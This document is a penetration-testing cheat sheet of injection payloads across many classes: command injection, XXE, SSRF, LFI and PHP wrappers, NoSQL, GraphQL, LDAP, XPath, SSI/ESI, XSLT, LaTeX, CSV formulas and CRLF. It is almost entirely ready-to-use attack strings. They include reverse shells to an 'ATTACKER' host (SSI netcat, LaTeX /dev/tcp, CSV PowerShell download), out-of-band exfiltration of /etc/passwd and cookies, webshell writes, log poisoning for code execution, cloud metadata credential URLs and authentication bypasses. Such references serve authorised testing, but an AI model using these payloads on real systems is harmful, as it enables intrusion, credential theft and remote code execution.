# Injection Reference: Command, XXE, SSRF, LFI, NoSQL, GraphQL, LDAP, XPATH, SSI, XSLT, LaTeX, CSV

---

## Command Injection

### Basic operators
```bash
cmd1 ; cmd2        # Always run both
cmd1 && cmd2       # Run cmd2 if cmd1 succeeds
cmd1 || cmd2       # Run cmd2 if cmd1 fails
cmd1 | cmd2        # Pipe
`cmd`              # Backtick substitution
$(cmd)             # $() substitution
```

### Blind (OOB)
```bash
# DNS exfil
; nslookup $(whoami).ATTACKER.com
; curl http://ATTACKER/$(whoami)
; ping -c1 ATTACKER
# Time-based
; sleep 5
; ping -c5 127.0.0.1
```

### Filter bypass
```bash
# IFS bypass (spaces)
IFS=,;ls,-la
IFS=$'\n';ls$IFS-la
cat${IFS}/etc/passwd
# Hex encoding
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
# Base64
echo "d2hvYW1p" | base64 -d | bash
# Wildcard
/b?n/cat /etc/pass*
/b[i]n/cat /etc/passwd
# Variable substitution
$'cat\x20/etc/passwd'
c$()at /etc/passwd
# Single chars missing
ca''t /etc/passwd
ca""t /etc/passwd
```

### Argument injection
```bash
# When exec() splits args, target binary flags
# Example: tar cz $user_input → inject --checkpoint-action=exec=
--checkpoint=1 --checkpoint-action=exec=id
# curl
-o /var/www/shell.php http://ATTACKER/shell.php
```

---

## XXE (XML External Entity)

### Classic
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

### Blind OOB
```xml
<!-- Host DTD at ATTACKER/evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">
%eval;
%exfil;
-->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>
<root/>
```

### Error-based
```xml
<!-- evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
-->
```

### Local DTD abuse
```xml
<!-- When outbound blocked; use local DTD to redefine entities -->
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abc/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<message>any</message>
```

### SVG XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX/PPTX XXE
Inject into `[Content_Types].xml`, `word/document.xml`, `xl/workbook.xml` etc. inside the ZIP archive.

---

## SSRF

### Localhost aliases
```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://0/
http://[::]/
http://[::1]/
http://0177.0.0.1/          # Octal
http://2130706433/           # Decimal
http://0x7f000001/           # Hex
http://127.1/                # Short
http://127.0.1/
http://①②⑦.⓪.⓪.①          # Unicode
```

### Bypass filter (advanced)
```
http://evil.com@127.0.0.1/admin
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
http://127.0.0.1%2523/admin     # Double URL encode
http://127.127.127.127/
```

### URL schemes
```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:25/_SMTP_COMMANDS
sftp://ATTACKER:11111/
ftp://ATTACKER:2121/
ldap://127.0.0.1:389/
netdoc:///etc/passwd
```

### Cloud metadata endpoints
```
# AWS (169.254.169.254)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/hostname
# AWS IMDSv2 (requires token)
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header required: Metadata-Flavor: Google
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header required: Metadata: true
# Digital Ocean
http://169.254.169.254/metadata/v1/
# Oracle Cloud
http://192.0.0.192/latest/
# Alibaba
http://100.100.100.200/latest/meta-data/
# Kubernetes etcd
http://127.0.0.1:2379/v2/keys/
# Docker
http://169.254.169.254/ (docker exposed)
http://docker.socket/
```

### SSRF Advanced Exploitation via Gopher
```
# Redis (write webshell or cron)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...

# Memcached
gopher://127.0.0.1:11211/_%0d%0aset%20shell%201%200%2028%0d%0a...

# FastCGI (PHP)
gopher://127.0.0.1:9000/_%01%01%00%01...
# Tool: gopherus --exploit phpmemcached/fastcgi/redis/smtp/mysqld

# SMTP via gopher
gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0a...

# MySQL via gopher
gopher://127.0.0.1:3306/_<MYSQL_AUTH_HANDSHAKE>

# Zabbix
gopher://127.0.0.1:10051/
```

---

## LFI / RFI & PHP Wrappers

### Basic LFI
```
/etc/passwd
../../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252fetc/passwd          # Double URL encode
..%00/etc/passwd                   # Null byte (PHP < 5.3.4)
```

### Target files
```
/etc/passwd, /etc/shadow, /etc/hosts
/var/log/apache2/access.log, /var/log/apache2/error.log
/proc/self/environ, /proc/self/cmdline, /proc/self/fd/N
/var/www/html/config.php, /app/config.py, /app/.env
C:\Windows\win.ini, C:\Windows\System32\drivers\etc\hosts
C:\Windows\Repair\SAM, C:\Windows\Repair\SYSTEM
```

### PHP Wrappers
```php
# Filter (base64 read source)
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
php://filter/read=string.rot13/resource=index.php

# Data (RCE if data:// allowed)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
data:text/plain,<?php echo shell_exec($_GET['cmd']);?>

# Phar (deserialization when phar:// reaches include())
phar://./uploaded.jpg/payload.php

# Zip
zip://./uploaded.zip%23shell.php

# Expect (RCE if expect:// enabled)
expect://id

# Input (POST body executed)
php://input
POST body: <?php system($_GET['cmd']); ?>

# iconv CVE-2024-2961 (file read bypass)
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode/resource=flag.php
```

### LFI to RCE

**Via /proc/self/fd**
```
# Upload file, find fd number via /proc/self/fd/N
/proc/self/fd/10
```

**/proc/self/environ**
```
# Inject into User-Agent header
User-Agent: <?php system('id'); ?>
GET /?page=/proc/self/environ HTTP/1.1
```

**iconv CVE-2024-2961** — arbitrary file read via filter chains

**Log Poisoning**
```bash
# Apache access.log
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/
# Then include: /?file=/var/log/apache2/access.log&cmd=id

# SSH authorized_keys
ssh '<?php system($_GET["cmd"]); ?>'@target
# Then include: /?file=/home/user/.ssh/authorized_keys

# /var/mail/www-data (send email with payload)
```

**PHP sessions**
```
# Find PHPSESSID, inject payload in session parameter
/?file=/var/lib/php/sessions/sess_PHPSESSID
```

**PEARCMD (ctf-common)**
```
/?+config-create+/&file=/usr/share/php/pearcmd.php&/<?=system($_GET['cmd'])?>+/tmp/shell.php
```

**phpinfo() race condition** - upload temp file, race to include before deletion.

---

## NoSQL Injection

### MongoDB Operators
```json
# Auth bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": "invalid"}}

# Extract data
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
```

```
# URL param injection
?username[$ne]=invalid&password[$ne]=invalid
?username[$regex]=^admin&password[$ne]=x
```

### Blind extraction
```python
# Binary search on username length
?username[$where]=this.username.length==5&password[$ne]=x

# Character-by-character
?username[$regex]=^adm&password[$ne]=x
?username[$regex]=^admi&password[$ne]=x
```

### JS injection (where clause)
```javascript
?where=sleep(5000)
?where=this.password.match(/^a/)
```

---

## GraphQL Injection

### Introspection
```graphql
# Full schema dump
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}

# Query type fields
{__schema{queryType{fields{name,description}}}}

# Mutation type
{__schema{mutationType{fields{name,args{name,type{name}}}}}}
```

### Common vulnerabilities
```graphql
# Batching attack (bypass rate limit)
[{"query":"mutation{login(user:\"a\",pass:\"1\"){token}}"},
 {"query":"mutation{login(user:\"a\",pass:\"2\"){token}}"},
 ...x1000]

# Field suggestion abuse
{__type(name:"User"){fields{name}}}

# Injection via argument
{user(id:"1 OR 1=1"){name,email}}
{user(id:"1' UNION SELECT...")  {...}}

# NoSQL injection in GraphQL
{users(filter:{username:{eq:"admin'"}})...}
```

### Tools
- InQL (Burp extension)
- GraphQL Voyager (schema visualization)
- Clairvoyance (introspection bypass wordlist)

---

## LDAP Injection

### Auth bypass
```
# Always-true
username: *)(uid=*))(|(uid=*
password: anything

# Comment injection (OpenLDAP)
username: admin)(&
password: anything
```

### Blind extraction (character by character)
```python
# Extract username
username: *)(|(uid=a*))
username: *)(|(uid=ad*))
# Extract password  
username: admin)(|(userPassword=a*))
```

### LDAP injection strings
```
*)(|(uid=*)
*)(|(objectClass=*)
*))(|(cn=*
admin)(&(password=*)
*
)(objectClass=*
```

---

## XPATH Injection

### Auth bypass
```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
' and count(/*) > 0 and '1'='1
```

### Blind extraction
```sql
# Length check
' and string-length(//user[1]/username)=5 and '1'='1

# Character extraction
' and substring(//user[1]/username,1,1)='a' and '1'='1
' and substring(//user[1]/username,1,1)=codepoints-to-string(97) and '1'='1
```

### OOB
```sql
' and doc('http://ATTACKER/?x='||//user[1]/password||'')
```

---

## SSI / ESI Injection

### SSI (Server-Side Includes)
```html
<!--#echo var="DATE_LOCAL" -->
<!--#printenv -->
<!--#exec cmd="id" -->
<!--#exec cmd="mkfifo /tmp/f;nc ATTACKER 4444 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f" -->
<!--#include file="/etc/passwd" -->
<!--#include virtual="/index.html" -->
<!--#set var="name" value="Rich" -->
```

### ESI (Edge Side Includes)
```html
<esi:include src=http://ATTACKER>
<esi:include src=http://ATTACKER/?cookie_stealer.php?=$(HTTP_COOKIE)>
<esi:include src="supersecret.txt">
<!--esi $add_header('Location','http://ATTACKER') -->
<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>
```

---

## XSLT Injection

### Vendor/version detection
```xml
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/></xsl:template>
</xsl:stylesheet>
```

### File read / SSRF (document())
```xml
<xsl:copy-of select="document('http://ATTACKER:25')"/>
<xsl:copy-of select="document('/etc/passwd')"/>
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

### RCE via PHP wrapper
```xml
<xsl:value-of select="php:function('system','id')" xmlns:php="http://php.net/xsl"/>
<xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','<?php echo system($_GET[cmd]); ?>')" xmlns:php="http://php.net/xsl"/>
```

### RCE via Java (Xalan)
```xml
<xsl:stylesheet xmlns:xsl="..." xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'id')"/>
    <xsl:value-of select="ob:toString($process)"/>
  </xsl:template>
</xsl:stylesheet>
```

### RCE via .NET (msxsl:script)
```xml
<msxsl:script implements-prefix="user" language="C#">
  <![CDATA[ public string exec(){ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); return ""; } ]]>
</msxsl:script>
```

---

## LaTeX Injection

### File read
```latex
\input{/etc/passwd}
\include{/etc/passwd}
\lstinputlisting{/etc/passwd}
\usepackage{verbatim}\verbatiminput{/etc/passwd}
```

### RCE (via \write18 if enabled)
```latex
\write18{id > /tmp/output}
\write18{bash -i >& /dev/tcp/ATTACKER/4242 0>&1}
\immediate\write18{id}
```

### XSS via mathjax
```latex
\url{javascript:alert(document.domain)}
\unicode{x0048;alert(1)}
```

---

## CSV Formula Injection

### DDE (Dynamic Data Exchange)
```
=cmd|' /C calc'!A0
=cmd|' /C powershell IEX(wget http://ATTACKER/shell.exe)'!A0
=HYPERLINK("http://ATTACKER","click")
DDE("cmd";"/C calc";"!A0")
@SUM(1+1)*cmd|' /C calc'!A0
```

### Google Sheets OOB
```
=IMPORTXML("http://ATTACKER/csv","//a/@href")
=IMPORTDATA("http://ATTACKER/log.php?d="&A1)
```

---

## HTTP Parameter Pollution

### Duplicate params behavior
| Platform | Behavior with `?p=a&p=b` |
|----------|--------------------------|
| PHP/Apache | Last (`b`) |
| Django | Last (`b`) |
| Ruby on Rails | Last (`b`) |
| ASP.NET/IIS | Concatenated (`a,b`) |
| Node.js | Concatenated (`a,b`) |
| JSP/Servlet | First (`a`) |
| Flask | First (`a`) |

### Exploitation
```
/transfer?amount=1&amount=5000
/app?debug=false&debug=true
?id=1&id=2                           # WAF sees first, app uses last
param=value1%26other=value2          # Encoded & in value
{"test":"user","test":"admin"}        # JSON duplicate keys
```

---

## CRLF Injection

### Basic
```
%0d%0a                 # \r\n
%0a                    # \n only
%0d                    # \r only
%E5%98%8A%E5%98%8D     # UTF-8 CRLF equivalent
```

### Session fixation
```
http://target.com/%0d%0aSet-Cookie:%20session=evil
```

### XSS via header injection
```
http://target.com/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Cache poisoning
```
http://target.com/%0d%0aX-Injected: header
```
